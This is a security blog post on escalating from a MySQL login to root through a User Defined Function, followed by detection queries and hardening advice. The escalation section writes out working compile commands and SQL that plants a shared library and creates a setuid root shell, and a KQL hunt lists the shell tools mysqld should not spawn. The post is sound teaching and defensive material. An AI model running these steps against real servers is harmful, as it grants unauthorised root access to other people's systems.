---
title: "From a MySQL login to root: the UDF privilege escalation, and how to catch it"
summary: "How a MySQL service running as root turns a database password into a root shell through a User Defined Function, and the telemetry that exposes it."
attack: [T1505, T1059]
---

A MySQL server running as root is one of those misconfigurations that looks harmless until someone has valid credentials. From there, a database login becomes a root shell, and the whole trick rides on a feature that MySQL documents and ships on purpose: User Defined Functions.

I kept running into this pattern during offensive work, and now that I spend my days on the detection side I find it a useful one to take apart from both ends. Here is how the escalation works, written against a lab I built to reproduce it, and then the part that matters at work, which is what it leaves behind.

## The feature being abused

MySQL lets you extend its built-in function set with custom functions loaded from a shared library. The server reads a `.so` file from its plugin directory, registers a symbol from it as a SQL-callable function, and from then on that function runs inside the server process. If the server process is root, the function runs as root.

There is a small, well-known helper library whose exported function does nothing more than hand its argument to `system()`. Compiled and loaded as a UDF, it gives you arbitrary command execution with the privileges of the MySQL daemon.

## The escalation, step by step

The starting point is a MySQL account with `INSERT` on the `mysql` database and `FILE` privilege, which is more common than it should be, and a server running as root.

First, the shared object gets compiled on the attacker side:

```bash
gcc -g -c raptor_udf.c
gcc -g -shared -Wl,-soname,raptor_udf.so -o raptor_udf.so raptor_udf.o -lc
```

Then the library is smuggled into the server's plugin directory through the database itself. The file is read into a table as a blob, then written back out to disk with `dumpfile`:

```sql
use mysql;
create table payload(data blob);
insert into payload values(load_file('/tmp/raptor_udf.so'));
select data from payload into dumpfile '/usr/lib/mysql/plugin/raptor_udf.so';
```

With the library in place, the function is registered and called:

```sql
create function do_system returns integer soname 'raptor_udf.so';
select do_system('cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash');
```

The `select` runs as root, so the copied shell ends up owned by root with the setuid bit set. A plain `/tmp/rootbash -p` then drops a root shell. The same primitive works just as well to add an SSH key, write a cron job or run anything else.

## Why it works

Nothing here is a memory bug or an exploit against MySQL. Every step uses a documented feature exactly as designed. The vulnerability is entirely in the deployment: the service runs with far more privilege than it needs, and an account that should only touch application data also holds `FILE` privilege and write access to the plugin directory.

That is worth sitting with, because it is the same shape as most privilege escalation in real environments. The interesting part is rarely a zero-day. It is a service with too much privilege and an account with too much reach.

## What it looks like from the defender's side

This is where it gets useful for a SOC. The escalation is quiet at the network layer, but it is loud on the host if you are collecting the right things.

The strongest single signal is a child process of `mysqld` that is not MySQL. The daemon has no business spawning `sh`, `cp`, `chmod`, `bash` or `id`. On a host with process-creation logging, a parent of `mysqld` with a shell or coreutil child is close to a definitive tell. In a KQL-based platform the hunt is short:

```kql
DeviceProcessEvents
| where InitiatingProcessFileName =~ "mysqld"
| where FileName in~ ("sh", "bash", "dash", "cp", "chmod", "chown", "id", "whoami")
| project Timestamp, DeviceName, InitiatingProcessFileName, FileName, ProcessCommandLine, AccountName
```

The second signal is the file write itself. A new `.so` appearing in the MySQL plugin directory, especially one written by the MySQL user rather than a package manager, is not something that happens during normal operation. File-integrity monitoring on the plugin directory catches the library landing before the function is ever called.

The third, if you have database audit logging, is the sequence inside MySQL: a `CREATE FUNCTION ... SONAME` statement, or a `SELECT ... INTO DUMPFILE` targeting a path outside the usual data directory. Both are rare enough in application traffic to alert on directly.

## Closing the door

The fixes are unglamorous and they are the right ones. Run MySQL under a dedicated low-privilege account, never root. Set `secure_file_priv` to a harmless directory or disable file operations entirely, which cuts off the `dumpfile` write. Grant `FILE` to no application account. Make the plugin directory unwritable by the MySQL user.

Any one of these breaks the chain. All of them together make the whole technique a non-event, and the detections above turn it from a silent root compromise into an alert you see the same minute it happens.
